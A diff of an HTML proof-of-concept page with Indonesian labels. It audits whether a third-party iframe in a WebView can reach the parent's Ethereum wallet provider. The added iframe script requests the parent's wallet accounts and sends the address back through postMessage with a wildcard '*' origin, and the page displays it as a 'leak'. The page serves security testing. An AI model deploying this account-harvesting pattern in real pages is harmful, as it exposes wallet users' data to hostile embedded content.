@@ -2,45 +2,65 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Uji Sandbox WebView</title>
+    <title>PoC: WebView Sandbox Escape</title>
     <style>
-        body { font-family: sans-serif; padding: 20px; background: #f4f4f9; }
-        .card { border: 2px dashed #dc3545; padding: 20px; background: white; }
-        iframe { width: 100%; height: 150px; border: 1px solid #ccc; margin-top: 10px; }
+        body { font-family: sans-serif; padding: 20px; background: #f0f2f5; }
+        .box { border: 2px solid #d9534f; padding: 20px; background: white; border-radius: 8px; }
+        #logs { background: #000; color: #0f0; padding: 15px; font-family: monospace; height: 200px; overflow-y: scroll; }
     </style>
 </head>
 <body>
-    <h1>Audit Sandbox WebView</h1>
-    <p>Status: <span id="status">Menguji...</span></p>
-
-    <div class="card">
-        <h3>Iframe Pihak Ketiga:</h3>
+    <h1>Audit Keamanan: Cross-Origin Leakage</h1>
+    <p>Domain Utama: <code id="mainDomain"></code></p>
+    
+    <div class="box">
+        <h3>Iframe (Pihak Ketiga):</h3>
         <iframe id="testIframe" src="about:blank"></iframe>
     </div>
 
+    <h3>Log Eksploitasi:</h3>
+    <pre id="logs"></pre>
+
     <script>
-        // Kita mencoba mengecek apakah iframe bisa mengakses window.ethereum dari halaman induk
+        document.getElementById('mainDomain').innerText = window.location.hostname;
+        const log = (msg) => document.getElementById('logs').innerHTML += `> ${msg}<br>`;
+
+        // Membuat iframe untuk mensimulasikan dApp berbahaya
         const iframe = document.getElementById('testIframe');
-        
-        // Memuat konten sederhana ke dalam iframe
         iframe.srcdoc = `
             <html>
-                <body>
-                    <p>Iframe mencoba akses window.ethereum...</p>
+                <body style="background:#fff3f3; padding:10px;">
+                    <p><b>Iframe Beraksi:</b> Mencoba mencuri akses provider...</p>
                     <script>
                         try {
                             if (window.parent.ethereum) {
-                                document.body.innerHTML += "<h3 style='color:red'>CELAH DITEMUKAN: Iframe bisa mengakses ethereum!</h3>";
+                                // MENCURI AKSES: Meminta alamat akun dari induk
+                                window.parent.ethereum.request({ method: 'eth_accounts' })
+                                .then(acc => {
+                                    window.parent.postMessage({type: 'LEAK', data: acc[0]}, '*');
+                                });
                             } else {
-                                document.body.innerHTML += "<h3 style='color:green'>Sandbox Aman: Akses terisolasi.</h3>";
+                                window.parent.postMessage({type: 'SAFE'}, '*');
                             }
                         } catch(e) {
-                            document.body.innerHTML += "<h3>Sandbox Aman (Terjadi error akses)</h3>";
+                            window.parent.postMessage({type: 'ERROR', data: e.message}, '*');
                         }
                     <\/script>
                 </body>
             </html>
         `;
+
+        // Mendengarkan hasil curian dari iframe
+        window.addEventListener('message', (event) => {
+            if (event.data.type === 'LEAK') {
+                log("<span style='color:red'>BERHASIL: Iframe mencuri alamat: " + event.data.data + "</span>");
+                alert("CRITICAL: Iframe berhasil mengakses akun: " + event.data.data);
+            } else if (event.data.type === 'SAFE') {
+                log("<span style='color:lime'>Sandbox Terisolasi dengan Aman</span>");
+            } else {
+                log("Error: " + event.data.data);
+            }
+        });
     </script>
 </body>
 </html>
